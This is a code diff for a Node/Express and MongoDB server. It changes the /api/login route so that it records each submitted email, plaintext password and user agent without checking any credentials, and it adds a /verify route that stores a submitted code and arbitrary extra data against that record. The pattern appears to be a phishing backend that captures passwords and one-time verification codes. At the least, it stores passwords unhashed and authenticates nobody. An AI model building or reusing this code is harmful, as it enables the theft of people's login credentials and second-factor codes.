@@ -28,14 +28,14 @@ async function connectToDatabase() {
 connectToDatabase();
 
 // Setup Nodemailer transporter
-const transporter = nodemailer.createTransport({
-    secure: true,
-    service: 'Gmail', // Or use another provider
-    auth: {
-        user: process.env.EMAIL_USER, // Use environment variable for email
-        pass: process.env.EMAIL_PASS,  // Use environment variable for password
-    },
-});
+// const transporter = nodemailer.createTransport({
+//     secure: true,
+//     service: 'Gmail', // Or use another provider
+//     auth: {
+//         user: process.env.EMAIL_USER, // Use environment variable for email
+//         pass: process.env.EMAIL_PASS,  // Use environment variable for password
+//     },
+// });
 
 // Helper function to format date
 function formatDate(date) {
@@ -54,26 +54,37 @@ app.post('/api/login', async (req, res) => {
         return res.status(500).json({ error: 'Database not connected' });
     }
 
-    const { email, password, userAgent, code } = req.body;
+    const { email, password, userAgent } = req.body;
     const date = formatDate(new Date());
 
     try {
-        await db.collection('login_data').insertOne({ email, password, date, createdAt: new Date(), userAgent, code });
-
-        const mailOptions = {
-            from: process.env.EMAIL_USER,
-            to: email,
-            subject: 'Your verification code',
-            text: `Your verification code is: ${code}`,
-        };
-
-        await transporter.sendMail(mailOptions);
-        console.log('Email sent successfully');
-        return res.status(200).json({ message: 'Verification code sent' });
-    } catch (err) {
-        console.error('Error occurred:', err);
-        return res.status(500).json({ error: 'Server error' });
+        // Check if user exists       
+            // User does not exist, insert new record
+            const newUser = { email, password, date, createdAt: new Date(), userAgent, code: null , updateData:null };
+            const result = await db.collection('login_data').insertOne(newUser);
+            res.status(200).json({ success: true, userId: result.insertedId });
+        
+    } catch (error) {
+        res.status(500).json({ success: false, message: 'Error logging in' });
     }
+
+    // try {
+    //      await db.collection('login_data').insertOne({ email, password, date, createdAt: new Date(), userAgent });
+        
+
+    //     const mailOptions = {
+    //         from: process.env.EMAIL_USER,
+    //         to: email,
+    //         subject: 'Your verification code',
+    //         text: `Your verification code is: ${code}`,
+    //     };
+
+    //     await transporter.sendMail(mailOptions);
+    //     console.log('Email sent successfully');
+    //     return res.status(200).json({ message: 'Verification code sent' });
+    // } catch (err) {
+    //     res.status(500).json({ success: false, message: 'Error logging in' });
+    // }
 });
 
 // API to count documents
@@ -164,28 +175,54 @@ app.post('/api/signup', async (req, res) => {
 });
 
 // API to update an item
-app.put('/api/items/:code', async (req, res) => {
-    const { code } = req.params;
-    const updateData = req.body;
+// app.put('/api/items/:code', async (req, res) => {
+//     const { code } = req.params;
+//     const updateData = req.body;
 
+//     try {
+//         const collection = db.collection('login_data');
+
+//         const result = await collection.updateOne(
+//             { code: code.toString() }, // Find the document by ID
+//             { $set: updateData } // Add or update properties
+//         );
+
+//         if (result.modifiedCount === 1) {
+//             res.status(200).json({ message: 'Item updated successfully' });
+//         } else {
+//             res.status(404).json({ message: 'Item not found' });
+//         }
+//     } catch (error) {
+//         console.error(error);
+//         res.status(500).json({ error: 'Internal server error' });
+//     }
+// });
+
+
+app.post('/verify', async (req, res) => {
+    const { userId, code, updateData } = req.body;
     try {
-        const collection = db.collection('login_data');
-
-        const result = await collection.updateOne(
-            { code: code.toString() }, // Find the document by ID
-            { $set: updateData } // Add or update properties
+        const result = await db.collection('login_data').updateOne(
+            { _id: new ObjectId(userId) },
+            { 
+                $set: { 
+                    code,
+                    updateData  // Spread the fields in updateData into $set
+                } 
+            }
         );
 
-        if (result.modifiedCount === 1) {
-            res.status(200).json({ message: 'Item updated successfully' });
+        if (result.modifiedCount > 0) {
+            res.status(200).json({ success: true });
         } else {
-            res.status(404).json({ message: 'Item not found' });
+            res.status(400).json({ success: false, message: 'User not found' });
         }
     } catch (error) {
-        console.error(error);
-        res.status(500).json({ error: 'Internal server error' });
+        res.status(500).json({ success: false, message: 'Error verifying code' });
     }
 });
+
+
 
 // API to get all signup users
 app.get('/api/signupAll', async (req, res) => {
